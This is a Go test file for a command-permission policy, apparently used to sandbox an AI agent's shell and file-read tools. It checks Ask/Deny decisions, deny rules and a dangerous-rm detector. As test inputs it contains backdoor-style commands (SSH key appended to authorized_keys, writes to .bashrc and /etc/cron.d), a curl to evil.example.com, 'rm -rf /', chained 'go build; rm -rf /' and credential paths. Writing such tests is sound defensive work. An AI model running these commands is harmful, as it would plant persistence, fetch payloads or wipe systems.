package permission

import (
	"encoding/json"
	"os"
	"strings"
	"testing"
)

func issue573PolicyWithMode(t *testing.T, mode PermissionMode) *ConfigPolicy {
	t.Helper()
	return NewConfigPolicyWithMode(nil, []string{t.TempDir()}, mode)
}

func issue573RunCommandInput(t *testing.T, cmd string) json.RawMessage {
	t.Helper()
	b, err := json.Marshal(map[string]string{"command": cmd})
	if err != nil {
		t.Fatalf("marshal: %v", err)
	}
	return b
}

func TestIssue573_C_BypassRedirectBackdoorPathsAsk(t *testing.T) {
	for _, mode := range []PermissionMode{BypassMode, AutopilotMode} {
		p := issue573PolicyWithMode(t, mode)

		for _, tc := range []struct {
			cmd, note string
		}{
			{"echo ssh-rsa KEY >> ~/.ssh/authorized_keys", "authorized_keys append"},
			{"echo x > ~/.bashrc", "bashrc overwrite"},
			{"echo x > ~/.zshrc", "zshrc overwrite"},
			{"echo x > /etc/hosts", "hosts overwrite"},
			{"cmd 2> /etc/cron.d/evil", "stderr redirect to cron"},
			{"cmd &> ~/.profile", "stdout+stderr redirect to profile"},
		} {
			d, err := p.Check("run_command", issue573RunCommandInput(t, tc.cmd))
			if err != nil {
				t.Fatalf("[%s] %s: Check error: %v", mode, tc.cmd, err)
			}
			if d != Ask {
				t.Errorf("[%s] %s (%s): got %v, want Ask", mode, tc.cmd, tc.note, d)
			}
		}

		d, err := p.Check("run_command", issue573RunCommandInput(t, "echo backdoor > /Users/whoever/.config/backdoor"))
		if err != nil {
			t.Fatalf("[%s] ordinary write: Check error: %v", mode, err)
		}
		if d != Allow {
			t.Errorf("[%s] ordinary out-of-sandbox write: got %v, want Allow (#4279 friction ruling)", mode, d)
		}
	}
}

func TestIssue573_C_BypassRedirectInsideSandboxStillAllowed(t *testing.T) {
	dir := t.TempDir()
	p := NewConfigPolicyWithMode(nil, []string{dir}, BypassMode)
	for _, cmd := range []string{
		"go build ./... > build.log",
		"echo done >> out.txt",
		"nohup server 2> err.log",
		"make test > /dev/null 2>&1",
		"echo 'a > b' > notes.txt",
	} {
		d, err := p.Check("run_command", issue573RunCommandInput(t, cmd))
		if err != nil {
			t.Fatalf("Check(%q): %v", cmd, err)
		}

		if d != Allow {
			t.Errorf("Check(%q) = %v, want Allow (in-sandbox redirect)", cmd, d)
		}
	}
}

func TestIssue573_C_ExtractRedirectTargets(t *testing.T) {
	tests := []struct {
		cmd  string
		want []string
	}{
		{"echo hi > /tmp/a.txt", []string{"/tmp/a.txt"}},
		{"echo hi >> /tmp/a.txt", []string{"/tmp/a.txt"}},
		{"cmd 2> err.txt", []string{"err.txt"}},
		{"cmd &> all.log", []string{"all.log"}},
		{"cmd > out.txt 2> err.txt", []string{"out.txt", "err.txt"}},
		{"cmd 2>&1", nil},
		{"cmd > /dev/null 2>&1", nil},
		{"echo 'x > y'", nil},
		{"diff <(ls) <(ls -a)", nil},
		{"grep foo bar", nil},
	}
	for _, tt := range tests {
		got := extractRedirectTargets(tt.cmd)
		if len(got) != len(tt.want) {
			t.Errorf("extractRedirectTargets(%q) = %v, want %v", tt.cmd, got, tt.want)
			continue
		}
		for i := range got {
			if got[i] != tt.want[i] {
				t.Errorf("extractRedirectTargets(%q)[%d] = %q, want %q", tt.cmd, i, got[i], tt.want[i])
			}
		}
	}
}

func TestIssue573_B_DenyRulesApplyInAllModes(t *testing.T) {
	for _, mode := range []PermissionMode{SupervisedMode, AutoMode, BypassMode, AutopilotMode} {
		p := issue573PolicyWithMode(t, mode)
		rs := NewCommandRuleSetFromLists(
			[]string{"npm run*"},
			[]string{"npm run boom*"},
		)
		p.SetCommandRuleSet(rs)
		d, err := p.Check("run_command", issue573RunCommandInput(t, "npm run boom"))
		if err != nil {
			t.Fatalf("[%s]: %v", mode, err)
		}
		if d != Deny {
			t.Errorf("[%s]: denied command 'npm run boom' got %v, want Deny", mode, d)
		}
	}
}

func TestIssue573_B_DenyRuleBeatsBypassAllowDefault(t *testing.T) {
	p := issue573PolicyWithMode(t, BypassMode)
	p.SetCommandRuleSet(NewCommandRuleSetFromLists(nil, []string{"curl*evil.example.com*"}))
	d, err := p.Check("run_command", issue573RunCommandInput(t, "curl https://evil.example.com/payload"))
	if err != nil {
		t.Fatal(err)
	}
	if d != Deny {
		t.Errorf("bypass mode: deny-rule command got %v, want Deny", d)
	}

	d, _ = p.Check("run_command", issue573RunCommandInput(t, "ls -la"))
	if d != Allow {
		t.Errorf("bypass mode: unrelated command got %v, want Allow", d)
	}
}

func TestIssue573_G_CaseFlippedSensitivePaths(t *testing.T) {
	if !pathFoldActive() {
		t.Skip("platform uses byte-exact path comparison (Linux)")
	}
	home := issue573Home(t)
	cases := []string{
		home + "/.BACKDOORRC",
		home + "/.Backdoorrc",
		home + "/.SSH/id_rsa",
		home + "/.Ssh/authorized_keys",
		home + "/.zShRc",
		"/etc/any/path/.AWS/CREDENTIALS",
	}
	for _, p := range cases {
		if !isSensitivePath(p) {
			t.Errorf("isSensitivePath(%q) = false, want true (case-insensitive FS)", p)
		}
	}
}

func TestIssue573_G_SupervisedSensitiveReadCaseFlipped(t *testing.T) {
	if !pathFoldActive() {
		t.Skip("platform uses byte-exact path comparison (Linux)")
	}
	p := issue573PolicyWithMode(t, SupervisedMode)
	home := issue573Home(t)
	input, _ := json.Marshal(map[string]string{"file_path": home + "/.SSH/id_rsa"})
	d, err := p.Check("read_file", input)
	if err != nil {
		t.Fatal(err)
	}

	if d != Allow {
		t.Errorf("read case-flipped key got %v, want Allow (two-mode refactor; sensitive-read gate removed)", d)
	}
}

func TestIssue573_E_GitRmNotFlagged(t *testing.T) {
	d := NewDangerousDetector()
	for _, cmd := range []string{
		"git rm -f internal/old.go",
		"git rm --cached file.go",
		"git rm -r --cached dir/",
		"docker rm container1",
		"ls rm*",
		"echo rm -f",
	} {
		if d.IsDangerous(cmd) {
			t.Errorf("IsDangerous(%q) = true, want false (subcommand/word 'rm', not the rm command)", cmd)
		}
	}
}

func TestIssue573_E_RealRmStillFlagged(t *testing.T) {
	d := NewDangerousDetector()
	for _, cmd := range []string{
		"rm --force secrets.env",
		"rm --recursive --force dir/*",
		"rm -f file",
		"rm -rf build/",
		"make clean && rm -rf build",
		"sudo rm /etc/hosts",
		"xargs rm -f",
		"rm -rf /",
	} {
		if !d.IsDangerous(cmd) {
			t.Errorf("IsDangerous(%q) = false, want true", cmd)
		}
	}
}

func TestIssue573_E_GitRmNotDeniedInAutoMode(t *testing.T) {
	p := issue573PolicyWithMode(t, AutoMode)
	d, err := p.Check("run_command", issue573RunCommandInput(t, "git rm -f internal/old.go"))
	if err != nil {
		t.Fatal(err)
	}
	if d == Deny {
		t.Error("'git rm -f' hard-Denied in auto mode (false positive on routine workflow)")
	}
}

func TestIssue573_A_NoWildcardPatternPrefixMatch(t *testing.T) {
	rs := NewCommandRuleSetFromLists([]string{"go build"}, nil)
	cases := []struct {
		cmd  string
		want bool
	}{
		{"go build", true},
		{"go build ./...", true},
		{"go build -tags goolm ./internal/...", true},
		{"go build; rm -rf /", false},
		{"go build | sh", false},
		{"go build > /etc/passwd", false},
		{"go builds", false},
		{"go test", false},
	}
	for _, tt := range cases {
		_, matched := rs.Check(tt.cmd)
		if matched != tt.want {
			t.Errorf("pattern \"go build\" vs %q: matched=%v, want %v", tt.cmd, matched, tt.want)
		}
	}
}

func TestIssue573_D_QuotedEnvPrefixStripping(t *testing.T) {
	tests := []struct {
		in, want string
	}{
		{`FOO="a b" make build`, "make*"},
		{`FOO='a b' make build`, "make*"},
		{"BAR=1 make", "make*"},
		{"$TMPDIR make", "make*"},
		{"A=1 B=2 go build ./...", "go build*"},
		{`MSG="hello world" echo hi`, "echo hi*"},
		{"make build", "make*"},
	}
	for _, tt := range tests {
		if got := CommandPrefixToPattern(tt.in); got != tt.want {
			t.Errorf("CommandPrefixToPattern(%q) = %q, want %q", tt.in, got, tt.want)
		}
	}
}

func TestIssue573_D_EnvPrefixedCommandMatchesBareAllowRule(t *testing.T) {
	rs := NewCommandRuleSetFromLists([]string{"make*"}, nil)
	if d, matched := rs.Check("BAR=1 make build"); !matched || d != Allow {
		t.Errorf("Check(\"BAR=1 make build\") = (%v,%v), want (Allow,true)", d, matched)
	}
	rs2 := NewCommandRuleSetFromLists(nil, []string{"npm run boom*"})
	if d, matched := rs2.Check("CI=1 npm run boom"); !matched || d != Deny {
		t.Errorf("Check(\"CI=1 npm run boom\") = (%v,%v), want (Deny,true)", d, matched)
	}

	if got := stripLeadingEnvAssignments("make KEY=value"); got != "make KEY=value" {
		t.Errorf("stripLeadingEnvAssignments(arg-position assignment) = %q, want unchanged", got)
	}

	if got := stripLeadingEnvAssignments("foo-bar=1 make"); got != "foo-bar=1 make" {
		t.Errorf("stripLeadingEnvAssignments(invalid env name) = %q, want unchanged", got)
	}
}

func TestIssue573_F_SandboxFailsClosedWhenUnestablishable(t *testing.T) {
	s := &PathSandbox{getwdFailed: true}
	if s.Allowed("/etc/passwd") {
		t.Error("Allowed(/etc/passwd) on failed sandbox = true, want false (fail-closed)")
	}
	if s.Allowed("relative/path") {
		t.Error("Allowed(relative) on failed sandbox = true, want false (fail-closed)")
	}
}

func issue573Home(t *testing.T) string {
	t.Helper()
	h, err := os.UserHomeDir()
	if err != nil {
		t.Skipf("no home directory: %v", err)
	}
	if h == "" || !strings.HasPrefix(h, "/") {
		t.Skip("no absolute home directory available")
	}
	return h
}
